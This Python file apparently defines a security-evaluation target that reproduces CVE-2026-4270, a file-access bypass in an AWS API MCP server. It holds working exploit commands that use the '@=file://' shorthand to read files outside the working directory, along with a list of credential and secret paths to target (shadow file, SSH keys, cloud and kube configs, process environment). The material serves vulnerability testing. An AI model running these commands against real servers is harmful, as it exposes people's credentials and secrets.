"""CVE-2026-4270: awslabs.aws-api-mcp-server file access restriction bypass (CWE-424).

call_aws validates an AWS CLI command client-side before execution. The shorthand `@=` paramfile
operator resolves file://|fileb:// through awscli.shorthand.LOCAL_PREFIX_MAP, which the vulnerable
range (>=0.2.14,<1.3.9) leaves pointing at the stock awscli handler: it reads any local path,
bypassing the workdir/no-access restriction. 1.3.9 points that map at get_file_validated, so a
path outside the working directory is rejected by validate_file_path.

The read content surfaces without AWS network or credentials because it lands in an Ebs field
whose type check fails client-side before any API call. VolumeSize (integer) echoes the head of
the value, enough for a short file nonce; /proc/self/environ (a long blob) would be truncated, so
its nonce is read through Encrypted (boolean), whose botocore type error echoes the whole value.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import filesystem_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKING_DIRECTORY = "/srv/app"  # the declared scope the launch passes as the final argument
AIM = re.compile(r"@=fileb?://")

# aws-credentials is excluded: the server reads ~/.aws itself through boto3's default chain, so a
# nonce there is not attributable to this flaw. The two guarded layout places (bare-remote-url,
# bare-history-env) route-check as not routed, so no layout place is kept.
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "container-hostname",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
)


def _readable_path(places: Places, place_id: str) -> str:
    place = places[place_id]
    if place.kind is PlantKind.ENV:
        return "/proc/self/environ"
    if place.kind is PlantKind.HOSTNAME:
        return "/etc/hostname"
    coordinates = place.coordinates
    raw = coordinates.path or next(iter(coordinates.paths or ()))
    return resolve_container_path(raw, WORKING_DIRECTORY)


def _read_command(path: str, *, bool_field: bool) -> str:
    # Encrypted (boolean) echoes the whole value; VolumeSize (integer) truncates after ~200 chars.
    field = "Encrypted" if bool_field else "VolumeSize"
    return (
        "aws ec2 run-instances --image-id ami-00000000000000000 "
        f"--block-device-mappings DeviceName=/dev/sda1,Ebs={{{field}@=file://{path}}}"
    )


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        bool_field = places[place_id].kind is PlantKind.ENV
        command = _read_command(_readable_path(places, place_id), bool_field=bool_field)
        await client.call_tool("call_aws", {"cli_command": command})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # A help lookup: no file argument, succeeds offline on both versions, surfaces no nonce.
    await client.call_tool("call_aws", {"cli_command": "aws ec2 describe-instances help"})


TARGET = CVETarget(
    cve_id="CVE-2026-4270",
    severity="CVSS 6.8 (v4.0, GHSA)",
    mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
    aim=AIM,
    reaches=frozenset({"arbitrary_read"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-4270-aws-api-mcp",),
    server_image="holdout-2026-4270-aws-api-mcp",
    patched_image="holdout-2026-4270-aws-api-mcp-patched",
    planting_host=PlantingHost(SymbolicUser.HOST, WORKING_DIRECTORY, has_network=False),
    builder=filesystem_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "File access restriction bypass (CWE-424): a call_aws shorthand @=file:// reference is "
        "read by awscli's unrestricted paramfile loader, outside the declared working directory."
    ),
    tools_filter=None,
)
